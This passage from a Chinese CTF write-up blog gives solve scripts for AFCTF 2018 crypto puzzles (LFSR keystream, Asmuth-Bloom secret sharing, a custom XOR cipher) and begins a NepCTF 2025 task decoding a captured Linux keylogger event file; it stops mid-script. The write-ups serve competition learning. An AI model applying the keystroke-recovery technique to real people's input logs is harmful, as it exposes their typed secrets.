class="hljs-string">&quot;rb&quot;</span>)<br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\flag.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>s = f.read()<br>f.close()<br>lent = <span class="hljs-built_in">len</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br>ff.write((s[i]^<span class="hljs-built_in">ord</span>(a[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a), lent):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp &lt;&lt; <span class="hljs-number">1</span>)^out<br>    ff.write((tmp^s[i]).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>ff.close()<br></code></pre></td></tr></table></figure><h1 id="你听说过一次一密吗"><a href="#你听说过一次一密吗" class="headerlink" title="你听说过一次一密吗"></a>你听说过一次一密吗</h1><p>貌似这题题目有些问题，而且之前在BUU上刷过，此次目的是查漏补缺，这里就不再多写了，直接上大佬讲解：<a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad 攻击</a></p><h1 id="花开藏宝地"><a href="#花开藏宝地" class="headerlink" title="花开藏宝地"></a>花开藏宝地</h1><p>题目附件有5个压缩包，根据提示分析，5个压缩包分别为数字爆破、小写字母爆破、大写字母爆破、伪加密、ntfs流隐写<br><img src="/2025/07/31/AFCTF%202018%20Writeup/file-20250802024021280.png"><br>最后获取到五组数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x1 = <span class="hljs-number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span><br>m1 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span><br>x2 = <span class="hljs-number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span><br>m2 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span><br>x3 = <span class="hljs-number">40952412095267791829743119118333311932687870987919948671780408726886151430242690997238831410249436653299224291445012397813221016909468630372862610415470277301591535416193017906909638241212666990959976187895288689640250810487806568164431359887246760313154046201720715301307811951233077581047872827004824833876458687145628724339714212107812941785880896399800008924818580623979723496070665230</span><br>m3 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351</span><br>x4 = <span class="hljs-number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span><br>m4 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span><br>x5 = <span class="hljs-number">230502064382947282343660159791611936696520807970361139469603458689311286041516767875903549263861950740778705012699983268093626403307298415066249636346303539570207577050391796770068203937723627361951969413683246596072925692670365490970847825269581004483964261491917680759091791653759514213188778401968676433284753781006738293752440186858616315727565803777032119737689210471541053061940547213</span><br>m5 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820822249</span><br></code></pre></td></tr></table></figure><p>题目还给了一个数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span><br></code></pre></td></tr></table></figure><p>原本没看懂是什么，后来搜了一下才知道是Asmuth-Bloom门限方案，参考：<a href="https://webencrypt.org/secretsharing/#bloom">Secret Sharing - Web Encrypt</a><br>直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>remainders = [<span class="hljs-number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span>, <span class="hljs-number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span>, <span class="hljs-number">40952412095267791829743119118333311932687870987919948671780408726886151430242690997238831410249436653299224291445012397813221016909468630372862610415470277301591535416193017906909638241212666990959976187895288689640250810487806568164431359887246760313154046201720715301307811951233077581047872827004824833876458687145628724339714212107812941785880896399800008924818580623979723496070665230</span>]<br>moduli = [<span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span>, <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span>, <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351</span>]<br>P = <span class="hljs-number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crt</span>(<span class="hljs-params">rs, ms</span>):<br>    total = <span class="hljs-number">0</span><br>    prod = math.prod(ms)<br>    <span class="hljs-keyword">for</span> r, m <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(rs, ms):<br>        p = prod // m<br>        total += r * <span class="hljs-built_in">pow</span>(p, -<span class="hljs-number">1</span>, m) * p<br>    <span class="hljs-keyword">return</span> total % prod<br><br><span class="hljs-built_in">print</span>(long_to_bytes(crt(remainders, moduli)%P))<br></code></pre></td></tr></table></figure><h1 id="一道有趣的题目"><a href="#一道有趣的题目" class="headerlink" title="一道有趣的题目"></a>一道有趣的题目</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#加密代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plainText</span>):<br>    space = <span class="hljs-number">10</span><br>    cipherText = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plainText)): <br>        <span class="hljs-keyword">if</span> i + space &lt; <span class="hljs-built_in">len</span>(plainText) - <span class="hljs-number">1</span>: <br>            cipherText += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(plainText[i]) ^ <span class="hljs-built_in">ord</span>(plainText[i + space]))  <br>        <span class="hljs-keyword">else</span>:<br>            cipherText += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(plainText[i]) ^ <span class="hljs-built_in">ord</span>(plainText[space]))    <br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(plainText[i]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>: <br>            space += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            space -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> cipherText<br>    <br><span class="hljs-comment"># 密码</span><br><span class="hljs-comment"># 15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>本题是一道算法逆向分析题，但是逆向求解时我们不知道<code>space</code>的具体值，也就没办法确定对应的计算方程。<br>但是我们可以发现密文的字节长度只有28，因此我们可以尝试爆破每一位明文的最后一位bit（总共约$2^{28}$种可能的序列），这样我们便能求出正确的<code>space</code>序列。<br>如何判断每个明文<code>lastbit（即代码中的seq）</code>序列是否正确呢？由于加密算法使用的是异或，因此可以利用加密算法来单独对明文的<code>lastbit</code>进行加密，再对比密文的<code>lastbit</code>是否一一对应，若确实一一对应，那大概率是正确的<code>lastbit</code>序列。<br>之后再通过我们已知的部分明文字节<code>afctf&#123;</code>，便可以逆向求解了。<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> trange<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lastbit</span>():<br>    space = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> trange(<span class="hljs-number">2</span>**<span class="hljs-number">28</span>):<br>        seq = <span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">28</span>)<br>        space = <span class="hljs-number">10</span><br>        f = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> i + space &lt; <span class="hljs-number">28</span> - <span class="hljs-number">1</span>:<br>                tx = <span class="hljs-built_in">int</span>(seq[i]) ^ <span class="hljs-built_in">int</span>(seq[i + space])<br>            <span class="hljs-keyword">else</span>:<br>                tx = <span class="hljs-built_in">int</span>(seq[i]) ^ <span class="hljs-built_in">int</span>(seq[space])<br><br>            <span class="hljs-keyword">if</span> tx != cipher[i] % <span class="hljs-number">2</span>:<br>                f = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(seq[i]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                space += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                space -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(seq)<br>            <span class="hljs-keyword">return</span> seq<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher_bytes, known_prefix=<span class="hljs-string">b&#x27;afctf&#123;&#x27;</span></span>):<br>    plain = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(cipher_bytes)<br>    space = <span class="hljs-number">10</span><br>    seq = get_lastbit()<br>    <span class="hljs-comment">#temp = 1010011010010101111111101001</span><br>    <span class="hljs-built_in">print</span>(seq)<br>    seq_bits = [<span class="hljs-built_in">int</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(seq)] <br>    <span class="hljs-built_in">print</span>(seq_bits)<br>    space_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(seq_bits)):<br>        <span class="hljs-keyword">if</span> seq_bits[i] % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            space += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            space -= <span class="hljs-number">1</span><br>        space_list.append(space)<br>    <span class="hljs-built_in">print</span>(space_list)<br>    <span class="hljs-comment">#部分已知前缀</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(known_prefix)):<br>        plain[i] = known_prefix[i]<br><br>    <span class="hljs-comment">#逆向逐字节恢复</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher_bytes)-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> i + space_list[i-<span class="hljs-number">1</span>] &lt; <span class="hljs-built_in">len</span>(cipher_bytes):<br>            plain[i] = plain[i + space_list[i-<span class="hljs-number">1</span>]] ^ cipher_bytes[i]<br>        <span class="hljs-keyword">else</span>:<br>            plain[i] = plain[space_list[i-<span class="hljs-number">1</span>]] ^ cipher_bytes[i]<br><br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>flag = decrypt(cipher)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF 2025 Writeup</title>
    <link href="/2025/07/25/NepCTF%202025%20Writeup/"/>
    <url>/2025/07/25/NepCTF%202025%20Writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a>NepBotEvent</h2><p>根据题目分析，该题所给的文件跟Keylogger有关，也就是跟键盘流量相关。<br>提到键盘流量分析，我们就会想到HID DATA的8字节的数据，而这个文件并不是流量数据包，因此不能够让wireshark帮我们提取出HID data，因此我们要通过二进制数据来分析出哪些数据代表着HID data。<br>通过搜索可以发现，其实该文件是 Linux 下常见的键盘事件数据，每组24个字节，对应 Linux input 子系统的 <code>input_event</code> 结构体。<br>该结构体定义在 <code>/usr/include/linux/input.h</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timeval</span> &#123;<br>    <span class="hljs-type">long</span> tv_sec;   <span class="hljs-comment">// 8字节，秒</span><br>    <span class="hljs-type">long</span> tv_usec;  <span class="hljs-comment">// 8字节，微秒</span><br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">input_event</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">timeval</span> time; <span class="hljs-comment">// 16字节</span><br>    __u16 type;          <span class="hljs-comment">// 2字节</span><br>    __u16 code;          <span class="hljs-comment">// 2字节</span><br>    __s32 value;         <span class="hljs-comment">// 4字节</span><br>&#125;<br></code></pre></td></tr></table></figure><p>直接ai一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exp.py</span><br><span class="hljs-comment"># 读取和解析Linux evdev键盘事件文件（每组24字节），恢复输入按键，同时记录shift按键的按下与松开</span><br><br><span class="hljs-keyword">import</span> struct<br><br>LINUX_KEYCODE = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;[ESC]&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">5</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-number">7</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">9</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-number">10</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-number">11</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-number">12</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-number">13</span>: <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-number">14</span>: <span class="hljs-string">&#x27;[BACKSPACE]&#x27;</span>, <span class="hljs-number">15</span>: <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-number">16</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">18</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;t&#x27;</span>,<br>    <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">24</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">26</span>: <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-number">27</span>: <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-number">28</span>: <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">29</span>: <span class="hljs-string">&#x27;[CTRL]&#x27;</span>,<br>    <span class="hljs-number">30</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">31</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">33</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">34</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">35</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-number">36</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-number">37</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-number">38</span>: <span class="hljs-string">&#x27;l&#x27;</span>,<br>    <span class="hljs-number">39</span>: <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-number">40</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">41</span>: <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-number">42</span>: <span class="hljs-string">&#x27;[LSHIFT]&#x27;</span>, <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-number">44</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-number">45</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">46</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">47</span>: <span class="hljs-string">&#x27;v&#x27;</span>,<br>    <span class="hljs-number">48</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">49</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-number">50</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-number">51</span>: <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-number">52</span>: <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">54</span>: <span class="hljs-string">&#x27;[RSHIFT]&#x27;</span>, <span class="hljs-number">55</span>: <span class="hljs-string">&#x27;[PRTSCR]&#x27;</span>,<br>    <span class="hljs-number">56</span>: <span class="hljs-string">&#x27;[ALT]&#x27;</span>, <span class="hljs-number">57</span>: <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">58</span>: <span class="hljs-string">&#x27;[CAPSLOCK]&#x27;</span>, <span class="hljs-number">59</span>: <span class="hljs-string">&#x27;[F1]&#x27;</span>, <span class="hljs-number">60</span>: <span class="hljs-string">&#x27;[F2]&#x27;</span>, <span class="hljs-number">61</span>: <span class="hljs-string">&#x27;[F3]&#x27;</span>, <span class="hljs-number">62</span>: <span class="hljs-string">&#x27;[F4]&#x27;</span>,<br>    <span class="hljs-number">63</span>: <span class="hljs-string">&#x27;[F5]&#x27;</span>, <span class="hljs-number">64</span>: <span class="hljs-string">&#x27;[F6]&#x27;</span>, <span class="hljs-number">65</span>: <span class="hljs-string">&#x27;[F7]&#x27;</span>, <span class="hljs-number">66</span>: <span class="hljs-string">&#x27;[F8]&#x27;</span>, <span class="hljs-number">67</span>: <span class="hljs-string">&#x27;[F9]&#x27;</span>, <span class="hljs-number">68</span>: <span class="hljs-string">&#x27;[F10]&#x27;</span>, <span class="hljs-number">69</span>: <span class="hljs-string">&#x27;[NUMLOCK]&#x27;</span>,<br>    <span class="hljs-number">70</span>: <span class="hljs-string">&#x27;[SCROLLLOCK]&#x27;</span>, <span class="hljs-number">71</span>: <span class="hljs-string">&#x27;[HOME]&#x27;</span>, <span class="hljs-number">72</span>: <span class="hljs-string">&#x27;[UP]&#x27;</span>, <span class="hljs-number">73</span>: <span class="hljs-string">&#x27;[PGUP]&#x27;</span>, <span class="hljs-number">74</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-number">75</span>: <span class="hljs-string">&#x27;[LEFT]&#x27;</span>, <span class="hljs-number">76</span>: <span class="hljs-string">&#x27;[CENTER]&#x27;</span>,<br>    <span class="hljs-number">77</span>: <span class="hljs-string">&#x27;[RIGHT]&#x27;</span>, <span class="hljs-number">78</span>: <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-number">79</span>: <span class="hljs-string">&#x27;[END]&#x27;</span>, <span class="hljs-number">80</span>: <span class="hljs-string">&#x27;[DOWN]&#x27;</span>, <span class="hljs-number">81</span>: <span class="hljs-string">&#x27;[PGDN]&#x27;</span>, <span class="hljs-number">82</span>: <span class="hljs-string">&#x27;[INS]&#x27;</span>, <span class="hljs-number">83</span>: <span class="hljs-string">&#x27;[DEL]&#x27;</span>,<br>    <span class="hljs-number">87</span>: <span class="hljs-string">&#x27;[F11]&#x27;</span>, <span class="hljs-number">88</span>: <span class="hljs-string">&#x27;[F12]&#x27;</span>, <span class="hljs-number">97</span>: <span class="hljs-string">&#x27;[RCTRL]&#x27;</span>, <span class="hljs-number">100</span>: <span class="hljs-string">&#x27;[RALT]&#x27;</span><br>    <span class="hljs-comment"># 可继续扩展</span><br>&#125;<br><br>SHIFT_CODES = [<span class="hljs-number">42</span>, <span class="hljs-number">54</span>]  <span class="hljs-comment"># 左右shift的keycode</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_evdev_event</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 结构体: struct timeval (2x8字节), type (H), code (H), value (I) 小端序</span><br>    tv_sec, tv_usec, type_, code, value = struct.unpack(<span class="hljs-string">&#x27;&lt;qqHHI&#x27;</span>, data)<br>    <span class="hljs-keyword">return</span> type_, code, value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keylog_restore</span>(<span class="hljs-params">filename</span>):<br>    result = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            chunk = f.read(<span class="hljs-number">24</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">24</span>:<br>                <span class="hljs-keyword">break</span><br>            type_, code, value = parse_evdev_event(chunk)<br>            <span class="hljs-comment"># 只处理键盘事件</span><br>            <span class="hljs-keyword">if</span> type_ == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span> code <span class="hljs-keyword">in</span> SHIFT_CODES:<br>           